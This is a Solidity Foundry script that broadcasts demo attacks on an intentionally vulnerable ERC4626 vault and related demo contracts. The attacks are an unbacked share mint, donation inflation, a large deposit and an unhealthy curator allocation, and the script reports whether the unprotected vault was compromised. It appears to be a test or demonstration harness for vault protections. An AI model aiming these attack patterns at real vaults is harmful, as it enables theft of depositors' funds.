// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

import {CuratorVaultDemo, VaultDemoMarket, VaultDemoOracle} from "../src/CuratorMarketDemo.sol";
import {VaultDemoToken, VulnerableERC4626Vault} from "../src/VulnerableERC4626Vault.sol";
import {VaultDemoDeploy} from "./VaultDemoDeploy.s.sol";

contract VaultDemoAttack is Script {
    struct AttackReport {
        bool unprotectedMintCompromised;
        uint256 unprotectedAssetsAfterMint;
        uint256 unprotectedSupplyAfterMint;
    }

    function run() external {
        address sender = _broadcastSender();
        VaultDemoDeploy.Deployment memory deployment = deploymentFromEnv(sender);
        string memory attack = vm.envOr("VAULT_DEMO_ATTACK", string("unprotected-mint"));
        AttackReport memory report;

        vm.startBroadcast();
        if (_eq(attack, "unprotected-mint")) {
            report = sendBroadcastBadMint(deployment.unprotectedVault, sender);
        } else if (_eq(attack, "protected-mint")) {
            report = sendBroadcastBadMint(deployment.protectedVault, sender);
        } else if (_eq(attack, "donation")) {
            sendBroadcastBadDonation(deployment.asset, deployment.protectedVault);
        } else if (_eq(attack, "large-deposit")) {
            sendBroadcastLargeDeposit(deployment.asset, deployment.protectedVault, sender);
        } else if (_eq(attack, "curator-allocation")) {
            deployment.curatorVault.allocate(address(deployment.market), 10 ether);
        } else {
            revert("VaultDemo: unknown attack");
        }
        vm.stopBroadcast();

        _logReport(report);
    }

    function deploymentFromEnv(address sender) public view returns (VaultDemoDeploy.Deployment memory deployment) {
        deployment.asset = VaultDemoToken(vm.envAddress("VAULT_DEMO_ASSET"));
        deployment.unprotectedVault = VulnerableERC4626Vault(vm.envAddress("VAULT_DEMO_UNPROTECTED_VAULT"));
        deployment.protectedVault = VulnerableERC4626Vault(vm.envAddress("VAULT_DEMO_PROTECTED_VAULT"));
        deployment.oracle = VaultDemoOracle(vm.envOr("VAULT_DEMO_ORACLE", address(0)));
        deployment.market = VaultDemoMarket(vm.envOr("VAULT_DEMO_MARKET", address(0)));
        deployment.curatorVault = CuratorVaultDemo(vm.envOr("VAULT_DEMO_CURATOR_VAULT", address(0)));
        deployment.safe = vm.envOr("VAULT_DEMO_SAFE", sender);
        deployment.attacker = sender;
        deployment.curator = sender;
    }

    function sendBroadcastBadMint(VulnerableERC4626Vault vault, address receiver)
        public
        returns (AttackReport memory report)
    {
        uint256 preAssets = vault.totalAssets();
        uint256 preSupply = vault.totalSupply();

        vault.mint(50 ether, receiver);

        report.unprotectedAssetsAfterMint = vault.totalAssets();
        report.unprotectedSupplyAfterMint = vault.totalSupply();
        report.unprotectedMintCompromised =
            report.unprotectedAssetsAfterMint == preAssets && report.unprotectedSupplyAfterMint == preSupply + 50 ether;
    }

    function sendBroadcastBadDonation(VaultDemoToken asset, VulnerableERC4626Vault vault) public {
        asset.approve(address(vault), 100 ether);
        vault.donateAssets(100 ether);
    }

    function sendBroadcastLargeDeposit(VaultDemoToken asset, VulnerableERC4626Vault vault, address receiver) public {
        asset.approve(address(vault), 50 ether);
        vault.deposit(50 ether, receiver);
    }

    function compromiseUnprotectedVault(VaultDemoDeploy.Deployment memory deployment)
        public
        returns (AttackReport memory report)
    {
        uint256 preAssets = deployment.unprotectedVault.totalAssets();
        uint256 preSupply = deployment.unprotectedVault.totalSupply();

        vm.prank(deployment.attacker);
        deployment.unprotectedVault.mint(50 ether, deployment.attacker);

        report.unprotectedAssetsAfterMint = deployment.unprotectedVault.totalAssets();
        report.unprotectedSupplyAfterMint = deployment.unprotectedVault.totalSupply();
        report.unprotectedMintCompromised =
            report.unprotectedAssetsAfterMint == preAssets && report.unprotectedSupplyAfterMint == preSupply + 50 ether;
    }

    function sendProtectedBadMint(VaultDemoToken, VulnerableERC4626Vault vault, address attacker) public {
        vm.prank(attacker);
        vault.mint(50 ether, attacker);
    }

    function sendProtectedBadDonation(VaultDemoToken asset, VulnerableERC4626Vault vault, address attacker) public {
        vm.prank(attacker);
        asset.approve(address(vault), 100 ether);

        vm.prank(attacker);
        vault.donateAssets(100 ether);
    }

    function sendProtectedLargeDeposit(VaultDemoToken asset, VulnerableERC4626Vault vault, address attacker) public {
        vm.prank(attacker);
        asset.approve(address(vault), 50 ether);

        vm.prank(attacker);
        vault.deposit(50 ether, attacker);
    }

    function sendProtectedLargeWithdraw(VulnerableERC4626Vault vault, address safe) public {
        vm.prank(safe);
        vault.withdraw(50 ether, safe, safe);
    }

    function sendUnhealthyCuratorAllocation(CuratorVaultDemo vault, address market, address curator) public {
        vm.prank(curator);
        vault.allocate(market, 10 ether);
    }

    function _logReport(AttackReport memory report) internal pure {
        console2.log("unprotectedMintCompromised", report.unprotectedMintCompromised);
        console2.log("unprotectedAssetsAfterMint", report.unprotectedAssetsAfterMint);
        console2.log("unprotectedSupplyAfterMint", report.unprotectedSupplyAfterMint);
    }

    function _eq(string memory a, string memory b) internal pure returns (bool) {
        return keccak256(bytes(a)) == keccak256(bytes(b));
    }

    function _broadcastSender() internal returns (address) {
        address[] memory wallets = vm.getWallets();
        if (wallets.length != 0) return wallets[0];
        return vm.envAddress("VAULT_DEMO_SENDER");
    }
}
